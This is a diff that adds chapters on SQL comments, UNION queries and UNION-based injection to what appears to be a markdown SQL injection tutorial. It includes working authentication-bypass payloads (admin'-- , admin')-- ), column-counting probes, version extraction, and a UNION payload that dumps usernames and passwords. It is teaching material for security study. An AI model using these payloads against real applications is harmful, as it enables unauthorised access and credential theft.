@@ -22,7 +22,14 @@
 - SQLi Discovery
 - OR Injection
 - Auth Bypass with OR Operator
-### 📋 Chapter 10: Command Reference
+- Using Comments
+### 🔗 Chapter 10: Union Clause
+- Union
+- Even Columns
+- Un-even Columns
+### 💉 Chapter 11: Union Injection
+- Finding the Injection / Detecting Columns / Location of Injection
+### 📋 Chapter 12: Command Reference
 
 ---
 
@@ -1935,6 +1942,660 @@ This works because the query evaluates to true irrespective of the username or p
 
 </details>
 
+<details>
+<summary><h3>Using Comments</h3></summary>
+
+Comments let us subvert the logic of more advanced queries — ignoring the trailing part of a query to end up with a working payload that bypasses authentication.
+
+<details>
+<summary><h4>Comment Syntax</h4></summary>
+
+Like any language, SQL supports comments to document queries or ignore part of them. MySQL has two line-comment styles — `-- ` and `#` — plus an in-line comment `/* */` (rarely used in basic SQLi).
+
+The `-- ` comment:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT username FROM logins; -- Selects usernames from the logins table
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++---------------+
+| username      |
++---------------+
+| admin         |
+| administrator |
+| john          |
+| tom           |
++---------------+
+4 rows in set (0.00 sec)
+```
+
+</td></tr>
+</table>
+
+> **NOTE:** Two dashes alone do **not** start a comment — there must be a space after them, so the comment begins with `-- ` (trailing space). In a URL this is often encoded as `--+`, since spaces in URLs are `+`. For clarity, a third dash is commonly appended (`-- -`) to make the space character explicit.
+
+The `#` symbol works too:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++----+----------+----------+---------------------+
+| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+
+|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
++----+----------+----------+---------------------+
+1 row in set (0.00 sec)
+```
+
+</td></tr>
+</table>
+
+The server ignores everything after `#` — here, the `AND password = 'something'` part is dropped during evaluation.
+
+> **TIP:** In a browser URL, `#` is treated as a fragment tag and is **not** sent to the server. To use `#` as a comment through a browser, URL-encode it as `%23`.
+
+</details>
+
+<details>
+<summary><h4>Auth Bypass with Comments</h4></summary>
+
+Back to the login example — inject `admin'-- ` as the username. The resulting query:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+```
+
+</td></tr>
+</table>
+
+The username is now `admin`, and the remainder of the query is ignored as a comment. This also guarantees no syntax issues from the trailing quote. Logging in with `admin'-- ` and any password:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'a';
+```
+
+🟢 **Login successful as user: admin**
+
+</td></tr>
+</table>
+
+Authentication is bypassed — the modified query checks only the username, with no other conditions.
+
+</details>
+
+<details>
+<summary><h4>Another Example — Parentheses</h4></summary>
+
+SQL uses parentheses when the app must check certain conditions before others. Expressions inside parentheses take precedence and are evaluated first. Consider a query that forces the user's `id` to be greater than 1 (blocking login as `admin`, whose `id` is 1) and hashes the password before use (blocking injection through the password field):
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
+```
+
+🔴 **Login failed!**
+
+</td></tr>
+</table>
+
+Even valid credentials `admin` / `p@ssw0rd` fail, because `admin`'s `id` equals 1:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='0f359740bd1cda994f8b55330c86d845';
+```
+
+🔴 **Login failed!**
+
+</td></tr>
+</table>
+
+Logging in as another user whose `id` is **not** 1, such as `tom`, works:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password='f86a3c565937e6315864d1a43c48e7';
+```
+
+🟢 **Login successful as user: tom**
+
+</td></tr>
+</table>
+
+So how do we log in as `admin`? Use a comment to cut off the rest of the query — try `admin'-- ` as the username:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE (username='admin'-- ' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
+```
+
+⚠️ **Error:** You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near `'437b930db84b8079c2dd804a71936b5f'` at line 1
+
+</td></tr>
+</table>
+
+The login fails with a syntax error — the open parenthesis was never closed. To fix it, our payload must add a closing parenthesis. Use `admin')-- ` to close and comment out the rest:
+
+<table width="100%">
+<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
+<tr><td>
+
+Executing query:
+
+```sql
+SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
+```
+
+🟢 **Login successful as user: admin**
+
+</td></tr>
+</table>
+
+The query succeeds and we log in as `admin`. The effective query after our input:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM logins WHERE (username='admin')
+```
+
+</td></tr>
+</table>
+
+Like the earlier example, this returns the row containing `admin`.
+
+</details>
+
+</details>
+
+</details>
+
+---
+
+<details>
+<summary><h2>🔗 Union Clause</h2></summary>
+
+So far we have only **manipulated** the original query to subvert logic and bypass authentication (OR operator, comments). Another class of SQLi injects an **entire new query** to run alongside the original — using the MySQL `UNION` clause to perform **UNION injection**.
+
+<details>
+<summary><h3>Union</h3></summary>
+
+The `UNION` clause combines the results of multiple `SELECT` statements. Through a UNION injection, we can `SELECT` and dump data from **anywhere** in the DBMS — multiple tables and databases.
+
+First, the `ports` table:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT * FROM ports;
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++----------+-----------+
+| code     | city      |
++----------+-----------+
+| CN SHA   | Shanghai  |
+| SG SIN   | Singapore |
+| ZZ-21    | Shenzhen  |
++----------+-----------+
+3 rows in set (0.00 sec)
+```
+
+</td></tr>
+</table>
+
+Then the `ships` table:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT * FROM ships;
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++----------+-----------+
+| Ship     | city      |
++----------+-----------+
+| Morrison | New York  |
++----------+-----------+
+1 rows in set (0.00 sec)
+```
+
+</td></tr>
+</table>
+
+Now combine both with `UNION`:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT * FROM ports UNION SELECT * FROM ships;
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++----------+-----------+
+| code     | city      |
++----------+-----------+
+| CN SHA   | Shanghai  |
+| SG SIN   | Singapore |
+| Morrison | New York  |
+| ZZ-21    | Shenzhen  |
++----------+-----------+
+4 rows in set (0.00 sec)
+```
+
+</td></tr>
+</table>
+
+`UNION` merged both `SELECT` outputs into one result — three rows from `ports` and one from `ships`.
+
+> **NOTE:** The data types of the selected columns must match across all positions.
+
+</details>
+
+<details>
+<summary><h3>Even Columns</h3></summary>
+
+`UNION` only operates on `SELECT` statements with an **equal number of columns**. UNIONing two queries with different column counts errors out:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT city FROM ports UNION SELECT * FROM ships;
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+```
+
+</td></tr>
+</table>
+
+First `SELECT` returns one column, second returns two → error. Once both queries return the same number of columns, `UNION` can extract data from other tables and databases. Given a vulnerable query:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM products WHERE product_id = 'user_input'
+```
+
+</td></tr>
+</table>
+
+We inject a `UNION` query so rows from another table are returned (assuming `products` has two columns):
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM passwords-- '
+```
+
+</td></tr>
+</table>
+
+This returns `username` and `password` entries from the `passwords` table.
+
+</details>
+
+<details>
+<summary><h3>Un-even Columns</h3></summary>
+
+Usually the original query does **not** have the same column count as the query we want to run — so we pad. Fill the remaining required columns with **junk data** to keep the total column count equal to the original query.
+
+Any string works as junk (`SELECT "junk" FROM passwords` returns `junk`), as do numbers (`SELECT 1 FROM passwords` returns `1`).
+
+> **NOTE:** Junk data types must match the columns' data types, or the query errors. We use **numbers** for simplicity — they also help **track payload positions** later.
+
+> **TIP:** For advanced SQLi, use `NULL` as filler — it fits every data type.
+
+`products` has two columns, so we UNION with two. To grab only `username`, pad the second column with a number:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2 FROM passwords
+```
+
+</td></tr>
+</table>
+
+More columns in the original table → add more numbers. If the original `SELECT` hit a four-column table:
+
+<table width="100%">
+<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
+<tr><td>
+
+```sql
+UNION SELECT username, 2, 3, 4 FROM passwords-- '
+```
+
+</td></tr>
+</table>
+
+Result:
+
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">
+
+**`mysql>`**
+
+</td><td>
+
+```sql
+SELECT * FROM products WHERE product_id UNION SELECT username, 2, 3, 4 FROM passwords-- '
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
++-----------+-----------+-----------+-----------+
+| product_1 | product_2 | product_3 | product_4 |
++-----------+-----------+-----------+-----------+
+|   admin   |    2      |    3      |    4      |
++-----------+-----------+-----------+-----------+
+```
+
+</td></tr>
+</table>
+
+The wanted output of `UNION SELECT username FROM passwords` lands in the **first column**, while the numbers `2, 3, 4` fill the remaining columns — confirming which positions are reflected.
+
+</details>
+
+</details>
+
+---
+
+<details>
+<summary><h2>💉 Union Injection</h2></summary>
+
+Now that we know how `UNION` works, let us use it in a real SQL injection against a web app. Take a port-search page that queries the database with our input:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| CN SHA | Shanghai | 37.13 |
+| CN SHE | Shenzhen | 23.97 |
+
+</td></tr>
+</table>
+
+The `port_code` parameter looks injectable. Apply the SQLi discovery step — inject a single quote (`'`):
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn'`
+
+⚠️ **Error:** You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near `''` at line 1
+
+</td></tr>
+</table>
+
+The error confirms the page is likely vulnerable. Since results are reflected on the page, this is ideal for **UNION-based injection**.
+
+<details>
+<summary><h3>Detecting the Number of Columns</h3></summary>
+
+Before exploiting, find how many columns the server's `SELECT` returns — the UNION query must match that count. Two methods:
+
+<details>
+<summary><h4>Using ORDER BY</h4></summary>
+
+Sort by column index, incrementing until the column no longer exists (error / no output). The last index that sorted successfully is the column count.
+
+> **Reminder:** `-- -` adds a trailing dash so the space after `--` is explicit.
+
+Start at column 1 — always succeeds (at least one column exists):
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=' order by 1-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| CN SHA | Shanghai | 37.13 |
+| CN SHE | Shenzhen | 23.97 |
+
+</td></tr>
+</table>
+
+Sort by column 2 — still works, results ordered differently (as expected):
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=' order by 2-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| AE DXB | Dubai | 15.73 |
+| BR SSZ | Santos | 3.6 |
+
+</td></tr>
+</table>
+
+Columns 3 and 4 also return results. Column 5 errors out:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=' order by 5-- -`
+
+⚠️ **Error:** Unknown column '5' in 'order clause'
+
+</td></tr>
+</table>
+
+Sorting failed at column 5, so the table has exactly **4 columns**.
+
+</details>
+
+<details>
+<summary><h4>Using UNION</h4></summary>
+
+The other way: UNION with a guessed column count until it succeeds. Opposite behavior — ORDER BY returns results until an error; UNION errors until a success. Start with 3 columns:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,2,3-- -`
+
+⚠️ **Error:** The used SELECT statements have a different number of columns
+
+</td></tr>
+</table>
+
+Column count mismatch. Try 4 columns:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,2,3,4-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| 2 | 3 | 4 |
+
+</td></tr>
+</table>
+
+Success — the table has **4 columns**. Either method works; once the count is known we can form the payload.
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>Location of Injection</h3></summary>
+
+A query may return several columns, but the app may print only some of them. Injecting into a column that is **not** displayed yields no visible output — so we must find which columns are reflected.
+
+In the 4-column UNION above, the query returned `1, 2, 3, 4`, but the page showed only `2, 3, 4`:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,2,3,4-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| 2 | 3 | 4 |
+
+</td></tr>
+</table>
+
+Column 1 is not printed (often an `id` field used to link tables, hidden from the user). Columns **2, 3, 4** are reflected — place the injection in any of them, never in column 1.
+
+> **NOTE:** This is why **numbers** make good junk data — they map directly to reflected positions, so we know where to drop the real query.
+
+Test with real data — swap the number `2` for `@@version` to pull the DB version:
+
+<table width="100%">
+<tr><td> 🔎 <b>Port search</b> </td></tr>
+<tr><td>
+
+`GET /search.php?port_code=cn' UNION select 1,@@version,3,4-- -`
+
+| Port Code | Port City | Port Volume |
+|---|---|---|
+| 10.3.22-MariaDB-1ubuntu1 | 3 | 4 |
+
+</td></tr>
+</table>
+
+The version prints in the reflected column. We now know how to form UNION payloads that surface query output on the page — next, enumerate the database and dump data from other tables.
+
+</details>
+
 </details>
 
 ---
@@ -1970,6 +2631,16 @@ Quick reference of the statements covered so far — this table will grow as mor
 | `OR` / `\|\|` | Logical OR — true if at least one condition is true |
 | `NOT` / `!` | Logical NOT — inverts a boolean value |
 | `' OR '1'='1` | Auth-bypass payload — forces the `WHERE` clause always true |
+| `-- ` / `#` | SQL line comments — ignore the rest of the query (`-- ` needs a trailing space) |
+| `/* */` | SQL in-line comment |
+| `admin'-- ` | Auth-bypass payload — comments out the password check |
+| `admin')-- ` | Auth-bypass payload — closes a parenthesis, then comments out the rest |
+| `%23` | URL-encoded `#`, to use it as a comment through a browser |
+| `SELECT ... UNION SELECT ...;` | Combine results of two `SELECT`s (must have equal column count + matching types) |
+| `UNION SELECT user, 2, 3 FROM t-- ` | UNION injection — dump another table, padding junk (`2,3` / `NULL`) to match columns |
+| `' ORDER BY <n>-- -` | Detect column count — increment `<n>` until it errors (last success = column count) |
+| `cn' UNION SELECT 1,2,3,4-- -` | Detect column count / reflected positions — numbers map to printed columns |
+| `cn' UNION SELECT 1,@@version,3,4-- -` | Confirm data extraction — print DB version in a reflected column |
 | `SHOW GRANTS;` | View the current user's privileges |
 
 </details>
